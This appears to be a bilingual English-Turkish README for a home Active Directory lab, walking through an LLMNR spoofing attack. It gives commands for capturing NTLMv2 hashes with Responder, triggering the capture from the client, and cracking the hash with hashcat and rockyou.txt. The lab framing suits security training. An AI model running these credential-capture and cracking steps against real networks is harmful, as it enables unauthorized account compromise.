@@ -1,0 +1,181 @@
+English:
+This lab environment was created to practice and document Active Directory attack scenarios. It consists of one Windows Server 2019 (Domain Controller), one Windows 10 (client), and one Kali Linux (attacker machine).
+
+Windows Server 2019: Configured with Active Directory Domain Services and acts as the domain controller of the network.
+
+Windows 10 Client: A user machine joined to the domain.
+
+Kali Linux: Used as the attacking machine for conducting network attacks.
+
+As a first step, an LLMNR Spoofing attack was successfully performed in this setup, allowing the capture of NTLM credentials. This page contains the commands used and a detailed explanation of the attack.
+
+Note: The network interface specified with the -I parameter may vary depending on your system setup. For example:
+
+If you're using VirtualBox: vboxnet0, vboxnet1
+
+For physical interfaces: eth0, eth1, ens33, wlan0, etc.
+
+To list your available network interfaces, you can run:
+ip a
+
+This will show all network interfaces. Make sure to identify the correct one before running Responder.
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Türkçe:
+Bu laboratuvar ortamı, Active Directory saldırı senaryolarını pratik etmek ve belgelemek amacıyla oluşturulmuştur. Ortamda bir adet Windows Server 2019 (Domain Controller), bir adet Windows 10 (client) ve bir adet Kali Linux (attack machine) bulunmaktadır.
+
+Windows Server 2019: Active Directory Domain Services kuruludur ve ağın etki alanı denetleyicisidir.
+
+Windows 10 Client: Etki alanına dahil edilmiş kullanıcı sistemidir.
+
+Kali Linux: Ağ saldırılarını gerçekleştirmek için kullanılan saldırgan makinedir.
+
+İlk adım olarak, bu yapı üzerinde LLMNR Spoofing saldırısı başarıyla gerçekleştirilmiş ve NTLM kimlik bilgileri ele geçirilmiştir. Bu sayfada, kullanılan komutlar ve saldırı detayları yer almaktadır.
+
+Not: -I parametresi ile belirtilen ağ arayüzü, her sistemde farklılık gösterebilir. Örneğin:
+
+VirtualBox ağı kullanıyorsanız: vboxnet0, vboxnet1
+
+Gerçek fiziksel ağ arayüzü için: eth0, eth1, ens33, wlan0 vb.
+
+Kendi sisteminizde mevcut ağ arayüzlerini listelemek için aşağıdaki komutu kullanabilirsiniz:
+ip a
+
+Bu komut, hangi ağ arayüzünün aktif olduğunu gösterecektir. Responder'ı çalıştırmadan önce doğru arayüzü tespit edip -I parametresinde onu kullanmalısınız.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+1--> sudo responder -I vboxnet0 -w
+
+2--> net use \\fakename\share
+
+While Responder is running, you can manually trigger an LLMNR request from the victim machine (e.g., Windows 10) using the following command:
+
+Explanation:
+fakename: A made-up hostname that does not exist on the network (e.g., \\abc123\share).
+
+net use: Command used in Windows to connect to a network share.
+
+When you run this command:
+
+Windows will first try to resolve fakename using DNS.
+
+If DNS fails, it falls back to LLMNR or NBT-NS and broadcasts a request like "Is there a host named fakename?"
+
+Responder intercepts this request and replies, pretending to be that host.
+
+The Windows client then sends authentication data (NTLMv2 hash).
+
+The Responder running on Kali captures this data.
+
+Note: This is a manual method for testing the attack and does not represent real-world trickery of a user.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Responder çalışır durumdayken, kurban (örneğin Windows 10) sistemde bilinçli olarak bir LLMNR isteği oluşturmak için şu komutu çalıştırabilirsiniz:
+
+net use \\fakename\share
+
+Açıklama:
+fakename: Ağda var olmayan, sahte bir hostname'dir. Örneğin, \\abc123\share gibi uydurma bir isim olabilir.
+
+net use: Windows'ta bir ağ paylaşımına bağlanmak için kullanılan komuttur.
+
+Bu komut çalıştırıldığında:
+
+Windows cihaz önce DNS ile bu hostname’i çözmeye çalışır.
+
+DNS başarısız olursa, cihaz LLMNR veya NBT-NS protokolleri üzerinden yayına çıkar: “fakename diye biri var mı?”
+
+Responder bu yayını yakalar ve “Evet, benim!” diyerek sahte bir sunucu olduğunu söyler.
+
+Windows istemcisi, kimlik bilgilerini (NTLMv2 hash) gönderir.
+
+Kali Linux’taki Responder aracı bu bilgileri yakalar.
+
+Not: Bu komut, gerçek bir kullanıcıyı kandırmak yerine saldırının test edilmesi amacıyla elle tetiklenmektedir.
+
+Cracking the Captured Hash with Hashcat
+After capturing the NTLMv2 hash using Responder, you can try to crack it using hashcat with a popular wordlist like rockyou.txt.
+
+3-->
+Save the captured hash into a text file, for example: hash.txt
+
+The hash format should look like this:
+victim::DOMAIN:1122334455667788:abcdef0123456789abcdef0123456789:0101000000000000...
+
+Use the following hashcat command to attempt cracking:
+hashcat -m 5600 -a 0 hash.txt rockyou.txt
+
+Explanation:
+-m 5600: Tells hashcat that the hash is NTLMv2
+
+-a 0: Dictionary attack mode
+
+hash.txt: File containing the captured hash
+
+rockyou.txt: Wordlist file to try passwords from
+
+If a password match is found, hashcat will display it on the screen.
+
+⚠️ Note: Make sure to have rockyou.txt available. On Kali Linux, it’s typically located at:
+
+
+/usr/share/wordlists/rockyou.txt.gz
+You may need to unzip it first:
+
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+
+Yakalanan hash’i bir dosyaya kaydedin. Örnek: hash.txt
+
+Hash formatı şu şekilde görünmelidir:
+
+
+victim::DOMAIN:1122334455667788:abcdef0123456789abcdef0123456789:0101000000000000...
+
+Aşağıdaki hashcat komutunu çalıştırarak kırma işlemini başlatın:
+hashcat -m 5600 -a 0 hash.txt rockyou.txt
+
+Açıklama:
+-m 5600: Hash türünün NTLMv2 olduğunu belirtir
+
+-a 0: Sözlük (dictionary) saldırı modu
+
+hash.txt: Hash’in kaydedildiği dosya
+
+rockyou.txt: Parolaların deneneceği wordlist dosyası
+
+Eğer wordlist’te eşleşen bir parola varsa, hashcat sonucu terminalde gösterecektir.
+
+⚠️ Not: rockyou.txt dosyasının sistemde yüklü olduğundan emin olun. Kali Linux’ta genellikle şurada bulunur:
+
+
+/usr/share/wordlists/rockyou.txt.gz
+Gerekirse önce sıkıştırmayı açmalısınız:
+
+
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+4-->
+If the password is successfully cracked using hashcat, this confirms that the LLMNR spoofing attack was successful and credentials were captured and cracked.
+
+If you're trying again but not getting a hash, make sure to clear the DNS cache on the victim machine using the following command:
+
+
+ipconfig /flushdns
+
+This ensures LLMNR requests are re-sent and not resolved from cache.
+
+
+Eğer hashcat ile parola başarıyla kırıldıysa, bu LLMNR spoofing saldırısının başarılı olduğunu ve kimlik bilgilerinin ele geçirildiğini gösterir.
+
+Tekrar deniyorsanız ama hash yakalanmıyorsa, hedef makinedeki DNS önbelleğini temizlediğinizden emin olun. Bunun için şu komutu kullanabilirsiniz:
+
+ipconfig /flushdns
+
+Böylece LLMNR isteklerinin önbellekten değil, tekrar ağ üzerinden gönderilmesi sağlanır
+
+THE END !
